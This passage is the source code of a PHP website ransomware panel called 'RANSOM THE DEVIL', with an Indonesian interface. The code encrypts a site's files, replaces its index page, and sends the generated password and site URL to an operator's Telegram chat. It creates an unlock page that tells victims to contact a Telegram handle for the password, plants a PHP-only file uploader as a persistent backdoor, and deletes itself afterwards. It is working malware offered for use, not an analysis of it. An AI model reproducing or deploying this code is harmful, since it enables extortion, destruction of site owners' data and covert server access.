        button{background:transparent;border:2px solid #00ff9d;color:#00ff9d;padding:14px;font-weight:bold;text-transform:uppercase;letter-spacing:2px;cursor:pointer;width:100%;border-radius:8px;transition:0.3s;font-size:1rem;}
        button:hover{background:#00ff9d;color:#0a0f1e;box-shadow:0 0 25px #00ff9d;}
        #loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0f1eee;display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;}
        .loader{border:4px solid #1e293b;border-top:4px solid #00ff9d;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px;box-shadow:0 0 20px #00ff9d;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .glitch-text{font-size:1.2rem;text-transform:uppercase;letter-spacing:5px;animation:glitch 1s infinite;}
        @keyframes glitch{0%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}25%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}50%{text-shadow:0.025em 0.05em 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}75%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}100%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}}
    </style>
</head>
<body>
<div id="loading-overlay"><div class="loader"></div><div class="glitch-text">MEMPROSES...</div></div>
<div class="container">
    <h2> UNLOCK WEBSITE The Devil Ransom</h2>
    contact t.me/felisaaprin to get the password
    <div class="security-badge">
        <span class="badge-item"><?php echo AEAD_CIPHER; ?></span>
        <span class="badge-item">PBKDF2 <?php echo PBKDF2_ITERATIONS; ?></span>
        <span class="badge-item">KOMPRESI <?php echo USE_COMPRESSION ? \'AKTIF\' : \'NONAKTIF\'; ?></span>
        <span class="badge-item high">THE DEVILs Dkid03</span>
    </div>
    <?php if ($message) echo $message; ?>
    <?php if ($attempts < 3): ?>
    <form method="post" id="unlockForm">
        <input type="hidden" name="action" value="unlock">
        <div class="form-group">
            <label>Password</label>
            <input type="password" name="password" placeholder="Masukkan password" required autofocus>
        </div>
        <button type="submit">BUKA</button>
    </form>
    <?php endif; ?>
</div>
<script>
document.getElementById(\'unlockForm\')?.addEventListener(\'submit\', function() {
    document.getElementById(\'loading-overlay\').style.display = \'flex\';
    this.querySelector(\'button\').disabled = true;
});
</script>
</body>
</html>';
    file_put_contents($unlock_file, $content);
    chmod($unlock_file, 0600);
}

// ------------------- OTP LOGIN LOCK PANEL -------------------
$step = 'request';
$error = '';
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

if (!check_bruteforce($client_ip)) {
    die("<div style='background:#0a0f1e;color:#ff0055;padding:20px;font-family:monospace;text-align:center;'>⛔ Terlalu banyak percobaan. Akses diblokir selama 1 jam.</div>");
}

if (isset($_SESSION['lock_auth']) && $_SESSION['lock_auth'] === true) {
    $step = 'panel';
} else {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
        if ($_POST['action'] === 'request_otp') {
            $input_verif = $_POST['verif'] ?? '';
            if ($input_verif !== $verif_code) {
                record_failed_attempt($client_ip);
                $error = '❌ Kode verifikasi salah.';
            } else {
                reset_bruteforce($client_ip);
                $otp = random_int(100000, 999999);
                $_SESSION['pending_otp'] = $otp;
                $_SESSION['pending_expire'] = time() + 300;
                $pesan = "🔑 *Kode Akses Lock Panel*\n\nKode Anda: `$otp`\n\nBerlaku 5 menit.";
                if (kirim_telegram($my_chat_id, $pesan)) {
                    $step = 'verify';
                } else {
                    $error = '❌ Gagal mengirim OTP. Periksa token bot.';
                }
            }
        } elseif ($_POST['action'] === 'verify_otp' && isset($_POST['otp'])) {
            if (isset($_SESSION['pending_otp'], $_SESSION['pending_expire']) && time() < $_SESSION['pending_expire']) {
                $input = $_POST['otp'];
                if ($input == $_SESSION['pending_otp']) {
                    reset_bruteforce($client_ip);
                    $_SESSION['lock_auth'] = true;
                    unset($_SESSION['pending_otp'], $_SESSION['pending_expire']);
                    $step = 'panel';
                } else {
                    record_failed_attempt($client_ip);
                    $error = '❌ Kode salah.';
                }
            } else {
                $error = '❌ Kode kadaluarsa.';
                unset($_SESSION['pending_otp'], $_SESSION['pending_expire']);
            }
        }
    }
}

if ($step === 'request') {
    ?><!DOCTYPE html><html><head><title>⚡ Lock Panel - OTP</title><style>body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}.container{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:350px;text-align:center;}input,button{width:100%;padding:10px;margin:10px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;}.error{color:#ff0055;}</style></head><body><div class="container"><h2>⚡ LOCK PANEL</h2><?php if ($error) echo "<div class='error'>$error</div>"; ?><form method="post"><input type="hidden" name="action" value="request_otp"><input type="text" name="verif" placeholder="Kode Verifikasi" required><button type="submit">MINTA KODE AKSES</button></form></div></body></html><?php
    exit;
}

if ($step === 'verify') {
    ?><!DOCTYPE html><html><head><title>⚡ Lock Panel - Verifikasi</title><style>body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}.container{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:350px;text-align:center;}input,button{width:100%;padding:10px;margin:10px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;}button:hover{background:#00ff9d;color:#000;}.error{color:#ff0055;}</style></head><body><div class="container"><h2>⚡ MASUKKAN KODE</h2><?php if ($error) echo "<div class='error'>$error</div>"; ?><form method="post"><input type="hidden" name="action" value="verify_otp"><input type="number" name="otp" placeholder="Kode 6 digit" required><button type="submit">VERIFIKASI</button></form><p><a href="?">Minta ulang</a></p></div></body></html><?php
    exit;
}

// ------------------- PANEL LOCK -------------------
$message = '';
$domain = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
$progress = load_progress();
if ($progress) {
    $message = "<div class='info' style='background:#ffaa0022;border:1px solid #ffaa00;padding:15px;margin-bottom:25px;'>⏳ Progress sebelumnya ditemukan: {$progress['processed']}/{$progress['total']} file ({$progress['locked']} terkunci). Lanjutkan dengan mengunci ulang.</div>";
}

// Fungsi membuat uploader
function create_uploader_file($uploader_file, $verif_code) {
    $content = '<?php
// Simple PHP File Uploader with password protection
session_start();
$verif_code = ' . var_export($verif_code, true) . ';
$upload_dir = __DIR__ . "/";
if (!isset($_SESSION["uploader_auth"])) {
    if (isset($_POST["verif"])) {
        if ($_POST["verif"] === $verif_code) {
            $_SESSION["uploader_auth"] = true;
        } else {
            $error = "❌ Kode verifikasi salah.";
        }
    }
    if (!isset($_SESSION["uploader_auth"])) {
        ?>
        <!DOCTYPE html>
        <html>
        <head><title>Uploader - Login</title>
        <style>body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}.container{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:300px;}input,button{width:100%;padding:8px;margin:5px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;}.error{color:#ff0055;}</style>
        </head>
        <body>
        <div class="container">
            <h2>🔐 UPLOADER LOGIN</h2>
            <?php if (isset($error)) echo "<p class=\'error\'>$error</p>"; ?>
            <form method="post">
                <input type="text" name="verif" placeholder="Kode Verifikasi" required>
                <button type="submit">MASUK</button>
            </form>
        </div>
        </body>
        </html>
        <?php
        exit;
    }
}
$message = "";
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
    $file = $_FILES["file"];
    if ($file["error"] === UPLOAD_ERR_OK) {
        $ext = strtolower(pathinfo($file["name"], PATHINFO_EXTENSION));
        $allowed = ["php", "phtml", "phar", "php5", "php7"];
        if (in_array($ext, $allowed)) {
            $dest = $upload_dir . basename($file["name"]);
            if (move_uploaded_file($file["tmp_name"], $dest)) {
                $message = "<div style=\'color:#00ff9d;\'>✅ File berhasil diupload: " . htmlspecialchars($file["name"]) . "</div>";
            } else {
                $message = "<div style=\'color:#ff0055;\'>❌ Gagal menyimpan file.</div>";
            }
        } else {
            $message = "<div style=\'color:#ff0055;\'>❌ Hanya file PHP yang diizinkan.</div>";
        }
    } else {
        $message = "<div style=\'color:#ff0055;\'>❌ Error upload.</div>";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>PHP Uploader</title>
<style>
body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px;}
.container{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:400px;text-align:center;}
input[type="file"]{margin:15px 0;background:#1e293b;color:#00ff9d;border:1px solid #00ff9d;padding:8px;width:100%;}
button{background:transparent;border:2px solid #00ff9d;color:#00ff9d;padding:10px 20px;cursor:pointer;width:100%;}
button:hover{background:#00ff9d;color:#0a0f1e;}
.message{margin:10px 0;padding:10px;border-radius:5px;}
a{color:#00ff9d;}
</style>
</head>
<body>
<div class="container">
    <h2>📤 UPLOAD FILE PHP</h2>
    <?php if ($message) echo "<div class=\'message\'>$message</div>"; ?>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">UPLOAD</button>
    </form>
    <p><a href="?logout=1">Logout</a></p>
</div>
</body>
</html>
<?php
if (isset($_GET["logout"])) {
    session_destroy();
    header("Location: " . $_SERVER["PHP_SELF"]);
    exit;
}
';
    return secure_file_put_contents($uploader_file, $content);
}

// Handler POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'upload' && isset($_FILES['html_file'])) {
        $file = $_FILES['html_file'];
        if ($file['error'] === UPLOAD_ERR_OK) {
            $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
            if (in_array($ext, ['html', 'htm'])) {
                if (move_uploaded_file($file['tmp_name'], $maintenance_file)) {
                    $message = '<div class="success">✅ File maintenance berhasil diupload.</div>';
                } else {
                    $message = '<div class="error">❌ Gagal menyimpan file.</div>';
                }
            } else {
                $message = '<div class="error">❌ Hanya file HTML yang diperbolehkan.</div>';
            }
        } else {
            $message = '<div class="error">❌ Error upload.</div>';
        }
    } elseif ($_POST['action'] === 'lock') {
        // ========== RESUME CERDAS ==========
        $resume_mode = false;
        $password = '';

        // Cek apakah ada file password plain (artinya proses sebelumnya belum selesai)
        if (file_exists($password_plain_file)) {
            $password = trim(file_get_contents($password_plain_file));
            if (!empty($password)) {
                if (!file_exists($password_file)) {
                    $hash = password_hash($password, PASSWORD_DEFAULT);
                    secure_file_put_contents($password_file, $hash);
                }
                $resume_mode = true;
            }
        }

        if (!$resume_mode) {
            $password = bin2hex(random_bytes(12));
            $hash = password_hash($password, PASSWORD_DEFAULT);
            if (secure_file_put_contents($password_file, $hash) === false) {
                $message = '<div class="error">❌ Gagal menyimpan password.</div>';
            } else {
                secure_file_put_contents($password_plain_file, $password);
            }
        }

        if (!empty($password)) {
            if ($resume_mode) {
                echo '<div class="info" style="background:#00ff9d22;border:1px solid #00ff9d;padding:15px;margin-bottom:25px;">⏳ Melanjutkan proses enkripsi yang tertunda dengan password yang sama...</div>';
            } else {
                $unlock_url = $domain . '/unlock.php';
                $pesan = "🔐 *WEBSITE DIKUNCI*\n\n"
                       . "🌐 *URL:* $domain\n"
                       . "🔑 *Password:* `$password`\n"
                       . "🔓 *Unlock:* $unlock_url\n\n"
                       . "⚡ *Security:* " . AEAD_CIPHER . " + PBKDF2 100k iterasi\n";
                if (!kirim_telegram($my_chat_id, $pesan)) {
                    $message = '<div class="error">❌ Gagal kirim Telegram. Periksa token bot.</div>';
                    unlink($password_file);
                    if (file_exists($password_plain_file)) unlink($password_plain_file);
                } else {
                    echo '<div class="info" style="background:#00ff9d22;border:1px solid #00ff9d;padding:15px;margin-bottom:25px;">⏳ Memulai enkripsi maksimum... (100k iterasi per file). Proses akan berjalan di background, Anda boleh menutup browser.</div>';
                }
            }

            if (empty($message)) {
                // Flush output dan tutup koneksi
                while (ob_get_level()) ob_end_clean();
                header('Connection: close');
                ignore_user_abort(true);
                ob_start();
                echo '<div class="info">Proses enkripsi sedang berjalan...</div>';
                $size = ob_get_length();
                header('Content-Length: '.$size);
                ob_end_flush();
                flush();
                if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();

                session_write_close();

                generate_unlock_file($unlock_file, $password_file, $extensions, $directories, $excluded_files, $index_file, $maintenance_file, $attempts_file, $bot_token, $domain, $my_chat_id, $verif_code, AEAD_CIPHER);

                if (file_exists($attempts_file)) unlink($attempts_file);
                if (file_exists($maintenance_file)) {
                    copy($maintenance_file, $index_file);
                } else {
                    file_put_contents($index_file, '<!DOCTYPE html><html><head><title>🔒 MAINTENANCE</title><style>body{background:#0a0f1e;color:#00ff9d;font-family:monospace;text-align:center;padding:50px;}</style></head><body><h1>🚧 MAINTENANCE MODE</h1><p>Website sedang dalam pemeliharaan.</p></body></html>');
                }

                try {
                    $count = lock_files_with_password($extensions, $directories, $excluded_files, $password);
                    if (!file_exists($uploader_file)) {
                        create_uploader_file($uploader_file, $verif_code);
                    }
                    if (file_exists($password_plain_file)) unlink($password_plain_file);
                    unlink(__FILE__);
                    file_put_contents(__DIR__ . '/.lock_result.log', "Sukses: $count file terkunci pada " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
                } catch (Exception $e) {
                    file_put_contents(__DIR__ . '/.lock_error.log', "Exception: " . $e->getMessage() . "\n", FILE_APPEND);
                }
                exit;
            }
        } else {
            $message = '<div class="error">❌ Gagal mendapatkan password.</div>';
        }
    } elseif ($_POST['action'] === 'self_delete') {
        if (unlink(__FILE__)) {
            $message = '<div class="success">✅ File dihapus.</div>';
            echo '<meta http-equiv="refresh" content="2;url=index.html">';
        } else {
            $message = '<div class="error">❌ Gagal hapus.</div>';
        }
    } elseif ($_POST['action'] === 'create_uploader_manual') {
        if (create_uploader_file($uploader_file, $verif_code)) {
            $message = '<div class="success">✅ uploader.php dibuat.</div>';
        } else {
            $message = '<div class="error">❌ Gagal.</div>';
        }
    }
}

// Tampilkan panel (HTML) dengan form dan tombol-tombol
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>RANSOM THE DEVILs</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#0a0f1e;font-family:'Courier New',monospace;color:#00ff9d;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 50%, #1a1f2e, #0a0f1e);}
        .container{max-width:700px;width:100%;background:#111827ee;backdrop-filter:blur(10px);border:2px solid #00ff9d;box-shadow:0 0 30px #00ff9d66, inset 0 0 20px #00ff9d33;border-radius:15px;padding:30px;animation:fadeIn 0.5s;}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}
        h2{text-align:center;font-size:2rem;text-transform:uppercase;letter-spacing:5px;text-shadow:0 0 10px #00ff9d;margin-bottom:20px;border-bottom:1px dashed #00ff9d;padding-bottom:10px;}
        .security-badge{display:flex;justify-content:center;gap:15px;margin-bottom:20px;flex-wrap:wrap;}
        .badge-item{background:#1e293b;padding:8px 15px;border-radius:20px;border:1px solid #00ff9d;font-size:0.9rem;}
        .badge-item.high{background:#ff005522;border-color:#ff0055;color:#ff0055;}
        .warning{background:#1e293b;border-left:5px solid #ffaa00;padding:15px;margin-bottom:25px;color:#00ff9d;font-size:0.9rem;box-shadow:0 0 10px #00ff9d33;}
        .card{background:#1e293b;border:1px solid #00ff9d;border-radius:10px;padding:25px;margin-bottom:30px;box-shadow:0 0 15px #00ff9d33;}
        .card h3{margin-bottom:20px;color:#00ff9d;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #00ff9d;padding-bottom:8px;}
        .form-group{margin-bottom:20px;}
        label{display:block;margin-bottom:8px;color:#00ff9d;text-transform:uppercase;font-size:0.9rem;letter-spacing:1px;}
        input[type="file"]{width:100%;padding:12px;background:#0a0f1e;border:1px solid #00ff9d;color:#00ff9d;font-family:inherit;border-radius:5px;}
        button{background:transparent;border:2px solid #00ff9d;color:#00ff9d;padding:14px;font-weight:bold;text-transform:uppercase;letter-spacing:2px;cursor:pointer;width:100%;border-radius:5px;transition:0.3s; margin-bottom:10px;}
        button:hover{background:#00ff9d;color:#0a0f1e;box-shadow:0 0 25px #00ff9d;}
        .success,.error{padding:15px;border-radius:5px;margin-bottom:25px;border:1px solid;font-weight:bold;animation:slideIn 0.3s;}
        @keyframes slideIn{from{opacity:0;transform:translateY(-10px);}to{opacity:1;transform:translateY(0);}}
        .success{background:#00ff9d22;border-color:#00ff9d;color:#00ff9d;}
        .error{background:#ff005522;border-color:#ff0055;color:#ff0055;}
        .status-box{background:#1e293b;border:1px solid #00ff9d;border-radius:10px;padding:15px;margin-top:20px;}
        .badge{display:inline-block;padding:5px 12px;border-radius:20px;font-weight:bold;text-transform:uppercase;font-size:0.75rem;}
        .badge.locked{background:#ff0055;color:#0a0f1e;}
        .badge.unlocked{background:#00ff9d;color:#0a0f1e;}
        #loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0f1eee;display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;}
        .loader{border:4px solid #1e293b;border-top:4px solid #00ff9d;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px;box-shadow:0 0 20px #00ff9d;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .glitch-text{font-size:1.2rem;text-transform:uppercase;letter-spacing:5px;animation:glitch 1s infinite;}
        @keyframes glitch{0%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}25%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}50%{text-shadow:0.025em 0.05em 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}75%{text-shadow:-0.05em -0.025em 0 #00ff9d, 0.025em 0.05em 0 #ff0055;}100%{text-shadow:0.05em 0 0 #00ff9d, -0.05em -0.025em 0 #ff0055;}}
        .small-note{color:#6c757d;font-size:0.8rem;margin-top:8px;}
        .info{background:#00ff9d22;border:1px solid #00ff9d;padding:15px;margin-bottom:25px;}
        .button-group { display: flex; gap: 10px; }
    </style>
</head>
<body>
<div id="loading-overlay"><div class="loader"></div><div class="glitch-text">MENGUNCI WEBSITE...</div></div>
<div class="container">
    <h2>⚡ RANSOM THE DEVIL ⚡</h2>

    <div class="security-badge">
        <span class="badge-item">🔐 <?php echo AEAD_CIPHER; ?></span>
        <span class="badge-item">⚡ PBKDF2 100k</span>
        <span class="badge-item">📦 KOMPRESI AKTIF</span>
        <span class="badge-item high">Dkid03</span>
    </div>

    <div class="warning">
        <strong>⚠️ MAXIMUM SECURITY MODE:</strong> Enkripsi dengan <?php echo AEAD_CIPHER; ?> + PBKDF2 100.000 iterasi + kompresi aktif. 
        Password 24 karakter hex dikirim via Telegram. Proses mungkin lebih lambat tapi sangat aman.
    </div>

    <?php if ($message) echo $message; ?>

    <div class="card">
        <h3>📤 UPLOAD MAINTENANCE</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <div class="form-group">
                <input type="file" name="html_file" accept=".html,.htm" required>
            </div>
            <button type="submit">UPLOAD</button>
        </form>
    </div>

    <div class="card">
        <h3>🔒 KUNCI WEBSITE</h3>
        <form method="post" id="lockForm">
            <input type="hidden" name="action" value="lock">
            <button type="submit" id="lockBtn">KUNCI DENGAN KEAMANAN MAKSIMUM</button>
            <p class="small-note">
                <?php if (file_exists($password_plain_file)): ?>
                ⚠️ Proses sebelumnya belum selesai. Klik untuk melanjutkan dengan password yang sama.
                <?php else: ?>
                Password 24 karakter akan dikirim ke Telegram (chat ID: <?php echo $my_chat_id; ?>)
                <?php endif; ?>
            </p>
        </form>
    </div>

    <!-- Fitur Tambahan: Self Delete dan Buat Uploader Manual -->
    <div class="card">
        <h3>🛠️ ALAT TAMBAHAN</h3>
        <div class="button-group">
            <form method="post" style="flex:1;" onsubmit="return confirm('Yakin ingin menghapus file ini?')">
                <input type="hidden" name="action" value="self_delete">
                <button type="submit" style="background:#ff0055; border-color:#ff0055; color:#fff;">🗑️ SELF DELETE</button>
            </form>
            <form method="post" style="flex:1;">
                <input type="hidden" name="action" value="create_uploader_manual">
                <button type="submit">📂 BUAT UPLOADER PHP</button>
            </form>
        </div>
        <p class="small-note">Self Delete: Hapus file ini secara manual. Buat Uploader: Membuat uploader.php (dengan kode verifikasi) untuk upload file PHP.</p>
    </div>

    <div class="status-box">
        <p><strong>STATUS SISTEM:</strong></p>
        <?php
        if (file_exists($password_file)) {
            echo '<p><span class="badge locked">🔒 TERKUNCI</span> File password ada.</p>';
        } else {
            echo '<p><span class="badge unlocked">🔓 TERBUKA</span> Website terbuka.</p>';
        }
        if (file_exists($maintenance_file)) {
            echo '<p>📁 File maintenance: maintenance.html siap.</p>';
        } else {
            echo '<p>📁 Belum upload maintenance.</p>';
        }
        if (file_exists($uploader_file)) {
            echo '<p>📂 Uploader PHP: uploader.php tersedia.</p>';
        }
        if (file_exists($password_plain_file)) {
            echo '<p>⏳ Proses enkripsi sedang berlangsung atau tertunda.</p>';
        }
        ?>
    </div>
</div>

<script>
document.getElementById('lockForm')?.addEventListener('submit', function(e) {
    document.getElementById('loading-overlay').style.display = 'flex';
    document.getElementById('lockBtn').disabled = true;
});
</script>
</body>
</html>
